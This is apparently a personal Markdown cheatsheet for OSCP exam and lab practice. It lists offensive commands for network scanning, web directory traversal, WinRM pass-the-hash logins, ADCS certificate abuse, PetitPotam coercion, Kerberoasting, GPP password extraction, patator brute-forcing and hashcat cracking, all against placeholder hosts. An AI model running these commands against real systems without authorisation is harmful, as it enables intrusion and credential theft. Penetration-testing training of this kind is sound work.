# OSCP Cheatsheet
Your content here
## Formatting Requirements
- Capitalization and underscores (`File_Name.txt`)
- `host.domain.tld` preferred (e.g., Kerberos) over `#.#.#.#` unless required. Or `attack.domain.tld` where necessary.
- Keep any variables to be modified to the left in a command (to enable faster CLI modification)
- Prefer single quotes
- Single quote usernames (Unquoted `PC$` would break the command)
- Quote all paths
- Use `$HtB` and `$Tools` paths (set in `~/.zshrc`)
- Only add `sudo` if actually required
- Specify `tun0` whenever possible to prevent adapter issues from arising

## Port Discovery
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 -e tun0 #.#.#.#
```
1. Paste results into Sublime and enable regex
2. Move UDP to the top of the page
3. Find `^.*rt `, Find All, backspace
4. Find `/.*$`, Find All, backspace
5. Find `\n`, Find All, backspace, enter `n`, Delete key
```
nmap host.domain.tld -p 22,80 -Pn -sC -sV --open -e tun0 -oA '.\nmap_TCP_Initial'
```
```
sudo nmap host.domain.tld -p 53,135 -Pn -sC -sV --open -e tun0 -sU -oA '.\nmap_UDP_Initial'
```
## Web Application Security
Your content here
- File/Directory Enumeration
- Virtual Host Enumeration
- View Source Code / Inspect Console
- Directory Traversal
- Directory Listing
- Patch checks
- Password Guessing
- 403 forbidden bypass
- SQL Injection
- LFI/RFI

Resources:
- https://github.com/riramar/Web-Attack-Cheat-Sheet

### File/Directory Enumeration
```
ffuf -u 'http://host.domain.tld/FUZZ' -w '/usr/share/wordlists/dirb/big.txt'
```
```
ffuf -u 'http://host.domain.tld/FUZZ.php' -w '/usr/share/wordlists/dirb/big.txt'
```
### Virtual Host (subdomain) Enumeration
```
gobuster vhost -u host.domain.tld -w '/usr/share/wordlists/amass/subdomains-top1mil-5000.txt' -t 50 --append-domain 
```
### Parameter Mining
- https://github.com/s0md3v/Arjun

```
arjun -u 'http://host.domain.tld?id=1'
```
```
arjun -u 'http://host.domain.tld?id=1' --stable
```
### Directory Traversal
- https://github.com/jcesarstef/dotdotslash
- `/etc/passwd` (readable by all users)
- `/var/www/html` (Apache2)
- `\windows\win.ini` (readable by all users) (slashes don't necessarily matter)
- `C:\inetpub\wwwroot`
- ?param=phpinfo();
- https://gist.github.com/jonlabelle/3f9aa4a5f3a2e41b7b4a81232047435c

```
python "$Tools/dotdotslash/dotdotslash.py" --url 'http://host.domain.tld/bWAPP/directory_traversal_1.php?page=/etc/passwd' --string '/etc/passwd' --cookie 'PHPSESSID=<ID>; security_level=3'
```
### Vulnerability Scanning
- https://github.com/sullo/nikto/issues/728

```
nikto -host='http://host.domain.tld' -maxtime=60s -C all
```
### Bypass 403
- https://github.com/iamj0ker/bypass-403

```
bash "$Tools/bypass-403/bypass-403.sh" host.domain.tld index.html
```
## Linux/UNIX Security
Your content here
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://fuzzysecurity.com/tutorials/16.html
- https://pentestmonkey.net/tools/audit/unix-privesc-check

### OpenLDAP
Your content here
- https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
## Windows and AD Security
Your content here
### PSRemoting / WinRM

```
$U = 'localhost\User'
$P = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $U, $P
Invoke-Command -Computername host.domain.tld -ScriptBlock { Get-ChildItem '$env:homedrive\Users\User\Desktop' } -Credential "$Cred"
```
```
evil-winrm -u 'User' -p 'Password123!' -i host.domain.tld
evil-winrm -u 'User' -H '31d6cfe0d16ae931b73c59d7e0c089c0' -i host.domain.tld
impacket-wmiexec domain.tld/'User':'Password123!'@host.domain.tld
```
### User Permissions
```
whoami /all
```
### Defender Status
```
Get-MpComputerStatus
```
### Certificate Services
- https://github.com/zer1t0/certi
- https://github.com/ly4k/Certipy
- https://github.com/GhostPack/Certify

**ESC1**
```
./Certify.exe cas /quiet
./Certify.exe find /quiet /vulnerable /currentuser
./Certify.exe request /ca:'host.domain.tld\CA' /template:'Template' /altname:'User' /quiet
```
Copy both private key and certificate into cert.pem and then:
```
openssl pkcs12 -in 'Cert.pem' -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out 'Cert.pfx'
```
- https://github.com/fortalice/modifyCertTemplate
- https://github.com/GhostPack/Rubeus
```
Rubeus.exe asktgt /user:'User' /certificate:'.\Cert.pfx' /getcredentials
```
- https://github.com/dirkjanm/PKINITtools
- https://github.com/AlmondOffSec/PassTheCert

### DNS
```
dnsrecon -n #.#.#.# -d domain.tld -a -x './dnsrecon.xml' -c './dnsrecon.csv'
```
### LDAP(S)
- https://github.com/CroweCybersecurity/ad-ldap-enum

```
python "$Tools/ad-ldap-enum/ad-ldap-enum.py" -l host.domain.tld -d domain.tld -n -o 'ad-ldap-enum_Anon_'
python "$Tools/ad-ldap-enum/ad-ldap-enum.py" -l host.domain.tld -d domain.tld -u 'User' -p 'Password123!' -o 'ad-ldap-enum_Auth_'
```
- https://github.com/cddmp/enum4linux-ng

```
python "$Tools/enum4linux-ng/enum4linux-ng.py" -C host.domain.tld -A -R -Gm -oA '.\enum4linux-ng_Anon'
```
1. Pull usernames: `grep 'username\:.*' 'enum4linux-ng_Anon.yaml' | cut -d : -f 2 > 'Domain_Users.txt'`
2. Delete `krbtgt` from it
```
openssl s_client host.domain.tld:636
```

### Microsoft SQL
- DBeaver: Fix theme colors: Window > Preferences> General > Appearance > Theme

```
nmap host.domain.tld -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info -e tun0
```
```
patator mssql_login host=host.domain.tld user='User' password='Password123!' --csv='mssql_single.csv' --max-retries=0 windows_auth=0
```
```
impacket-mssqlclient 'User':'Password123!'@host.domain.tld
```
```
python "$Tools/msdat/msdat.py" all -s host.domaint.ld -U 'User' -P 'Password123!'
```
- [Known to have an xp_dirtree problem ](https://github.com/quentinhardy/msdat/issues/14)
### RPC

```
python "$Tools/PetitPotam/PetitPotam.py" attack.domain.tld host.domain.tld -pipe all
```
- LM downgrade (`Responder`) or WebDAV (`attack@80/index.html` or `attack.domain.tld@80/index.html`) possible
```
impacket-rpcdump host.domain.tld
```
- https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

```
rpcclient host.domain.tld -U '' -N
```
```
ridenum host.domain.tld 500 50000
```

### SMB
- https://github.com/crowecybersecurity/shareenum

```
"$Tools/shareenum/src/shareenum" host.domain.tld -o './shareenum_Anon'
"$Tools/shareenum/src/shareenum" host.domain.tld -u 'Domain\User' -p 'Password123!' -o './shareenum_Auth'
```
```
smbclient -L ////host.domain.tld -U '' -N
smbclient -L ////host.domain.tld -U 'User' -N
smbclient -L ////host.domain.tld -U 'User' --password 'Password123!'
smbclient //host.domain.tld/Share -U '' -N
smbclient //host.domain.tld/Share -U 'User' -N
smbclient //host.domain.tld/Share -U 'User' --password 'Password123!'
smbmap -H host.domain.tld -u 'User' -p 'Password123!' -d localhost -R
```
```
nmap host.domain.tld --script smb-vuln* -p 137,139,445 -e tun0
```
```
impacket-Get-GPPPassword domain.tld/'User':'Password123!'@host.domain.tld
```
### Kerberos
**User Enumeration**
```
nmap host.domain.tld --script krb5-enum-users --script-args krb5-enum-users.realm='domain.tld' -Pn -p 88 -oA './krb5-enum' -e tun0
```
```
nmap host.domain.tld --script krb5-enum-users --script-args krb5-enum-users.realm='domain.tld',userdb='/usr/share/seclists/Usernames/Names/names.txt' -Pn -p 88 -oA './krb5-enum-names' -e tun0
```

**ASREPRoast**
```
impacket-GetNPUsers domain.tld/ -usersfile 'Domain_Users.txt' -format hashcat -outputfile 'Impacket_ASREPRoast_Anon.txt'
```
```
impacket-GetNPUsers domain.tld/'User':'Password123!' -outputfile 'Impacket_ASREPRoast_Auth.txt'
```
**Kerberoast**
```
impacket-GetUserSPNs domain.tld/'User':'Password123!' -dc-ip host.domain.tld -target-domain domain.tld -outputfile 'Impacket_Kerberoast.txt'
```
### Patch Management
Don't expect a patch to be missing in the real world, but we're in test environments:
**EternalBlue**
- https://github.com/3ndG4me/AutoBlue-MS17-010

```
python "$Tools/AutoBlue/eternal_checker.py" host.domain.tld
```
## Password Guessing
Your content here
### SMB
- `grep -v 'FAILURE' 'smb_user_pass.csv'`
```
patator smb_login host=host.domain.tld user='User' password='Password123!' domain=domain.tld port=445 --max-retries=0 --csv='smb_single.csv'
```
```
patator smb_login host=host.domain.tld password='Password123!' user=FILE0 port=445 0='/usr/share/wordlists/seclists/cirt-default-usernames.txt' --max-retries=0 --csv='smb_user.csv'
```
```
patator smb_login host=host.domain.tld user='User' domain=domain.tld password=FILE0 port=445 0='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='smb_pass.csv'
```
```
patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password=FILE1 port=445 0='Domain_Users.txt' 1='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='smb_user_pass.csv'
```
### SSH
```
patator ssh_login host=host.domain.tld user='User' password='Password123!' port=22 --max-retries=0 --csv='ssh_single.csv'
```
```
patator ssh_login host=host.domain.tld password='Password123!' port=22 user=FILE0 0='/usr/share/wordlists/seclists/cirt-default-usernames.txt' --max-retries=0 --csv='ssh_user.csv'
```
```
patator ssh_login host=host.domain.tld user='User' port=22 password=FILE0 0='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='ssh_pass.csv'
```
## Hashcat
NameThatHash (nth)

**NetNTLMv2**
```
hashcat -m 5600 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_NTLMv2.txt'
```
**ASREPRoast - RC4**
```
hashcat -m 18200 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_ASREPRoast_RC4.txt'
```
## Data Obfusication
Your content here
**Base64 String Decode**
```
echo 'acd==' | base64 -d
```
## Attacker Local
Your content here
**Python Virtual Environment (>=3.11)**
```
python -m venv '$HtB/Box/Box_venv'
```
**Change Python Versions**
- https://github.com/pyenv/pyenv

```
pyenv versions
pyenv global #.#
exec $SHELL
```
**SCP**
```
scp 'local-file.txt' User@host.domain.tld:'/home/user'
```